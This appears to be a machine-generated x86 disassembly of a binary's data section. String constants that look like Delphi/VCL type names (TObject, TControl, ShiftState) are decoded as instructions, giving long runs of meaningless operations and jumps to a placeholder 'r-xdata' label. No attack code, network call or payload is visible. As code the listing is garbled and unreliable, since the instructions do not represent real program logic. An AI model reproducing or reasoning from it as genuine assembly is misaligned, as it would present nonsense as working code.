arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x44a7 ] al
adc [ eax ] al
nop
fsubr [ ebx + 0xe080044 ]
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add [ edx + ebx * 2 + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x5533ffc0 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax ] ah
mov [ 0xffffffffac840044 ] al
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
and [ edx - 0x537bffbc ] ah
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
push esp
stosd [ edi ]
inc esp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x54abffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add al al
movsb [ edi ] [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x52b7ffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add al ah
lodsb [ esi ]
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ edi ] al
inc esp
add [ edx + ebx * 2 + 0x103c0041 ] dh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x53c3ffc0 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al al
movsb [ edi ] [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x44a7 ] al
adc [ eax ] al
nop
fsubr [ ebp + 0xc080044 ]
push esp
add al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sbb al 0xaf
inc esp
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
xor [ esp + eax * 2 ] dh
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
shl [ esp + eax * 2 + 0x44ae9000 ] 0x0
or [ ecx ] dl
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x44b0a4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] dh
mov ah 0x44
add [ eax ] al
add [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ eax ] dh
mov ah 0x44
add [ eax ] cl
mov esp 0x10000044
inc eax
add [ esi + ebp * 4 + 0x44 ] al
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44b01cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4e ] ah
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
movsb [ edi ] [ esi ]
mov al 0x44
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
or [ ebp ] al
cwde
jmp r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
push esp
jmp 0x834b232
add [ eax ] al
pop eax
jo r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] dl
out dx al
inc esp
add [ ebp + edi * 8 + 0x44 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add [ eax + 0x4800450c ] al
xor al [ eax ]
xor al [ fs : eax ]
sub al 0xea
jo r-xdata
add [ eax + 0x70 ] bl
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ebx * 2 + 0x103c0041 ] dh
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov [ edi + 0x17080044 ] gs
lea eax [ eax ]
mov esp 0x44b1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] cl
inc esp
add [ esp + esi * 4 ] dh
inc esp
add [ eax ] al
jbe r-xdata
add [ esi ] ah
mov ah 0x44
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edx + ebx * 2 + 0x41 ] dh
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] bl
mov cl 0x44
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc esp
add [ eax + 0x19 ] ah
inc ebp
add [ eax + 0xd ] bl
inc ebp
add [ edi + ecx * 4 + 0x19280041 ] ch
inc ebp
add [ ebp * 8 - 0x136fffbc ] ah
inc esp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
add [ edx + ebp * 8 ] ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_44a3fe
inc esp
add al bl
int 0x44
add [ edi + ecx * 8 + 0x44 ] al
add [ eax + 0x500044ce ] ah
into
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
inc esp
add [ ecx + edx * 8 + 0x44 ] al
add [ eax - 0x43ffbb33 ] bh
int3
inc ebx
outsd
outsb
je r-xdata
int 0x44
add al bl
int 0x44
add al ah
int 0x44
add [ eax - 0x30 ] bl
inc esp
add [ eax - 0x31 ] ch
inc esp
add [ eax + 0x1c0044d0 ] ah
rol [ eax + eax + 0x30 ] 0x1
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax + 0xf ] 0x1
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
je r-xdata
inc esp
add al ah
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 - 0x5c ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x5c ] si
inc esp
add al bl
mov [ 0x44 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x33ffbfce ] ah
into
inc esp
add [ eax ] al
iretd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700044a4 ] dh
add [ eax ] al
add [ eax - 0x5e ] cl
inc esp
add al ah
xor al 0x40
add [ eax - 0x32 ] al
inc esp
add [ eax ] dh
into
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
iretd
add al ah
int 0x44
add [ eax - 0x30 ] bl
inc esp
add [ eax - 0x31 ] ch
inc esp
add [ eax + 0x1c0044d0 ] ah
rol [ eax + eax + 0x30 ] 0x1
rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax + 0x11 ] 0x1
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ecx
add [ edi + ecx * 4 + 0x57a40041 ] ch
inc edx
add [ eax + 0x54004257 ] dl
jecxz r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
aam 0xa5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax - 0x32 ] al
inc esp
add [ eax - 0x2f ] bl
inc esp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
iretd
add [ ebx + 0x44a538c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x44 ] dh
add [ eax ] dh
add [ eax ] al
sub [ esp + eax * 2 + 0x4034e000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add [ eax + eax ] bl
add [ eax ] al
aam 0xb7
inc ebp
add al ah
xor al 0x40
add ah ch
xor al 0x40
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax + eax ] al
or [ ebx + 0x6f ] al
add [ eax - 0x67ffbe70 ] dl
nop
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44a70890
add [ ebx ] al
or al 0x54
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah cl
sbb eax [ edx ]
cwde
in eax 0x44
add [ eax ] al
sbb al 0x42
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ esi - 0x4143ffbc ] ah
inc ebp
add [ eax ] bl
out 0x44 eax
add ah ah
mov esi 0xbef80045
inc ebp
add [ eax + 0x4c0044e8 ] dl
out 0x44 eax
add [ edi + edi * 4 ] dh
inc ebp
add [ eax - 0x41 ] cl
inc ebp
add [ edi - 0x408fffbc ] al
inc ebp
add al ah
out 0x44 eax
add [ eax - 0x41 ] bh
inc ebp
add [ eax ] al
call 0xffffffffbfc4a712
inc ebp
add [ ecx + ebp * 8 ] dl
inc esp
add ah dh
call 0xffffffffe978a71e
inc esp
add [ eax ] ah
call 0xffffffffbfd8a726
inc ebp
add [ eax + 0x440045bf ] bl
call 0xffffffffe5f8a732
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
inc edx
outsd
insb
jae r-xdata
add ah cl
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
jae r-xdata
add [ ebp - 0x598bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
push edx
imul esp [ edi + 0x68 ] 0x6b610874
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] ah
add [ ecx + esi ] bl
inc edx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ esi + 0xe070044 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
inc eax
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x4fffbe71 ] al
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb0044a7 ] al
jae r-xdata
add al 0xa8
inc esp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] al
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax + 0x340044e7 ] bh
sbb al 0x42
add [ eax + ebp * 8 + 0x44 ] ah
add [ ebx + ebx + 0x1c180042 ] al
inc edx
add [ esp + ebx + 0x42 ] ch
inc edx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
dec ebp
popad
hlt
outsd
insb
jae r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rol [ edi + 0xa030044 ] 0x54
outsb
add [ fs : eax ] eax
add [ eax ] al
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
int3
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc eax
add [ eax + ebp * 4 + 0x8060044 ] cl
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
push edi
inc edx
add [ ebx + 0x44 ] dl
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ eax + 0x4004231 ] cl
add [ eax ] cl
inc ebx
outsd
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
test al 0x44
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
pushfd
add [ eax + eax ] dl
add bh bh
clc
in al 0x44
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x44a89c74
jb r-xdata
in al 0x44
add [ eax - 0x58 ] eax
jb r-xdata
jb r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
popad
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x44aa68c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
imul esp [ edi + 0x68 ] 0x44a89c74
imul esp [ gs : edi + 0x68 ] 0x44a89c74
add [ eax + eax ] cl
add bh bh
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
test al 0x44
add [ eax ] dl
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44a90873
add [ eax + 0x62 ] al
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jae r-xdata
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
inc eax
test al 0x44
imul ebp [ edi + 0x6e ] 0xa82cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
shl [ edi + 0x9030044 ] 0x1
push esp
inc esp
jb r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc esp
outsd
insb
jae r-xdata
clc
in al 0x44
inc ebx
outsd
outsb
jae r-xdata
add [ eax - 0x53ffbe70 ] bl
pop [ ecx ]
test ch ah
inc esp
add [ esp + 0x44 ] dh
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc esp
add [ ebx ] al
add [ eax ] al
add [ eax - 0x58 ] al
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
inc esp
add [ eax + 0x74614454 ] al
add [ gs : eax ] edi
test al 0x44
outsb
mov eax eax
sub al 0xa8
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x6d695454 ] al
add [ gs : eax + ebp * 4 + 0x44 ] eax
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ edx + ebx * 2 + 0x18900041 ] dh
stosd [ edi ]
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
